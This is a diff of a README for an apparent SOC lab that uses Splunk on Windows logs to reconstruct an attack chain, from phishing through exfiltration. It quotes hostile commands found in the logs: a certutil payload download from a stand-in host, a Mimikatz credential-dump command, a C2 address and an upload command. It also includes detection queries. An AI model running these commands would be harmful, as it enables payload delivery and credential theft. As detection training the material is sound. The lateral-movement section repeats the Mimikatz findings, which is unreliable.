@@ -19,7 +19,7 @@ The objective is to detect and analyze a full attack chain including:
 ## 🛠️ Tools
 
 - Splunk
-- Windows Event Logs
+- Windows Event Logs is [here](dataset/windows_logs.csv)
 
 ---
 
@@ -101,27 +101,75 @@ mshta
 rundll32
 
 Download command:
-certutil -urlcache -split -f http://malicious.site/payload.exe
+`certutil -urlcache -split -f http://malicious.site/payload.exe`
 Affected machines: multiple hosts (spread activity)
 These are legitimate Windows binaries abused for attacks.
 Conclusion: Living-off-the-land technique used to stay stealthy.
 
-##  Key Findings
+## Credential Dumping 
+Looking to steal credentials What tool is being used?
+```
+index=windows   command_line="*sekurlsa*"
+| stats count by user , command_line,extracted_host
+```
+<img width="1743" height="635" alt="image" src="https://github.com/user-attachments/assets/a58dee4d-567f-479e-bdb8-e307a8796f44" /> 
+Tool: Mimikatz 
+Host: WIN-APP01 
+User: administrator
+Command: `mimikatz sekurlsa::logonpasswords Conclusion: Credentials stolen from memory.
+## Lateral movement ;
+Which target machine is being attacked? Which source machine? Which account is being used?
+```
+index=windows process=psexec.exe
+| stats count by user , command_line,extracted_host
+```
+<img width="1833" height="644" alt="image" src="https://github.com/user-attachments/assets/29868af3-94bc-46db-8769-7424420ca621" />
 
-- Suspicious process chain:
-  winword.exe → powershell.exe
+Tool: Mimikatz
+Host: WIN-APP01 
+User: administrator
+Command: `mimikatz sekurlsa::logonpasswords `
+Conclusion: Credentials stolen from memory. 
 
-- Encoded PowerShell detected:
-  powershell -enc
+## C2 (Command & Control) 
 
-- Credential dumping:
-  mimikatz sekurlsa::logonpasswords
+Which external IP address is being contacted? Which port? What process makes the connection?
+``
+index=windows command_line="*connect*"
+| stats count by user , command_line,extracted_host
+``
+<img width="1916" height="758" alt="image" src="https://github.com/user-attachments/assets/c7c8f484-5ebd-4fa7-af43-4c3298f61f31" /> 
 
-- Lateral movement:
-  psexec \\WIN-DB01
+External IP: 185.193.88.10
+Port: 443 Process: PowerShell
+Conclusion: Beaconing to attacker server (C2). 
 
+## Exfiltration
+
+What file is being exfiltrated? Which machine? Which user?
+``
+index=windows command_line="*upload*"
+| stats count by user , command_line,extracted_host
+``
+<img width="1879" height="874" alt="image" src="https://github.com/user-attachments/assets/2096d89f-efac-4596-8b47-f2e2b7a35a4f" /> 
+File: data.zip 
+Host: WIN-DB01 
+User: administrator 
+Command: `powershell upload data.zip 
+Conclusion: Sensitive data was exfiltrated.
+
+## Summary of the attack: 
+
+> Initial access: phishing with invoice.docm on WIN-WS01
+>  > Execution: PowerShell encoded 
+>  > Persistence / LoLBins: certutil, bitsadmin, wmic
+>  > > Credential access: Mimikatz
+>  > > > Lateral movement: PsExec to WIN-DB01
+>  > > > > C2: connecting to 185.193.88.10:443
+>  > > > > > Exfiltration: data.zip file
 ---
+report is [here](phishingreport.md)
+---
+# Conclusion
 
-## 📊 Splunk Queries
-
-### Detect PowerShell encoded
+This investigation demonstrates how a SOC analyst can detect, analyze, and reconstruct a full attack chain using Windows logs in Splunk.
